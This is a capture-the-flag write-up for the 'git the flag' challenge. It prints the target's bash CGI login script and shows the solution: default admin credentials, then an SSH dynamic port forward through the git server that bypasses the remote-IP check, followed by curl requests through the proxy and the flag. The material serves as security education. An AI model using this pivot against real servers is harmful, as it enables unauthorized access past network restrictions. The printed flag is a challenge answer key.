# git the flag (misc, 96 pts, 58 solved)

This challenge is a CGI server and served its own source code using git.
The code that we're supposed to hack looks like this:

```bash
#!/bin/bash
set -euo pipefail
source /etc/config.ini
no_cache(){
    echo -ne "Pragma-directive: no-cache\n";
    echo -ne "Cache-directive: no-cache\n";
    echo -ne "Cache-control: no-cache\n";
    echo -ne "Pragma: no-cache\n";
    echo -ne "Expires: 0\n";
    echo -ne "Content-type: text/html\n\n"
}

success() {
    rm -f /tmp/login_session.txt
    cp /proc/sys/kernel/random/uuid /tmp/login_session.txt 2>&1
    echo -ne "Status: 302 Moved Temporarily\n"
    echo -ne "Set-Cookie: session=$(cat /tmp/login_session.txt)\n"
    echo -ne "Location: /cgi-bin/setup.cgi\n\n"
    exit
}

fail() {
    echo -ne "Content-type: text/html\n\n"

    echo "<html>"
    echo "<head><title>Omegalink login</title>"
    echo "<body><center>"
    echo "<h1>Login unsuccessful.</h1>"
    echo "<h3>Reason: $1</h3>"
    echo "<p><a href=/>Click here to try again</a></p>"
    echo "<p>This incident will be reported</p>"
    echo "</center></body>"
    echo "</html>"
    exit
}

parse_query() {
    saveIFS=$IFS
    IFS='=&'
    parm=($QUERY_STRING)
    IFS=$saveIFS

    declare -gA query_params
    for ((i=0; i<${#parm[@]}; i+=2))
    do
        query_params[${parm[i]}]="${parm[i+1]}"
    done
}

check_name_and_password() {
    pw_hash=$(echo -n "${query_params[password]}" | md5sum | cut -d ' ' -f 1)
    if [[ "${query_params[name]}" != $USERNAME || "$pw_hash" != $PASSWORD_HASH ]]; then
        fail "Wrong username or password"
    fi
}

check_remote_ip() {
    if [[ ! "$REMOTE_ADDR" =~ $ALLOWED_REMOTES ]]; then
        fail "$REMOTE_ADDR is not authorized to enter this site."
    fi
}

parse_query
check_name_and_password
check_remote_ip
success
```

There are two checks - check for name and password, and remote_ip.

The name and password was `admin` and `admin`. The author of this writeup
wasted some time, because the random md5 database he used didn't find it
for some weird reason (even though even google does)...

Anyway, the second check was harder. It was implemented correctly, so we had to
step back a bit. We remembered, that git clone works via ssh, we had credentials
that authenticated us to the server (to clone the code), and that ssh
allows any authenticated user to create a socks proxy.

So we quickly create one:

```bash
$ ssh git@35.234.131.107 -p 22222 -D 9090 "git-receive-pack '/code.git'"
```

And then two quick curls (what are webbrowsers for anyway?) are enough ftw:

```
curl "http://127.0.0.1/cgi-bin/login.cgi?name=admin&password=admin" -x socks5://127.0.0.1:9090 -vvv
curl "http://127.0.0.1/cgi-bin/setup.cgi" -x socks5://127.0.0.1:9090 -vvv --cookie session=fa3cc064-cf79-4691-a122-9723ae7fc79
```

And the flag is:

```
SaF{lmgtfy:"how to serve git over ssh"}
```
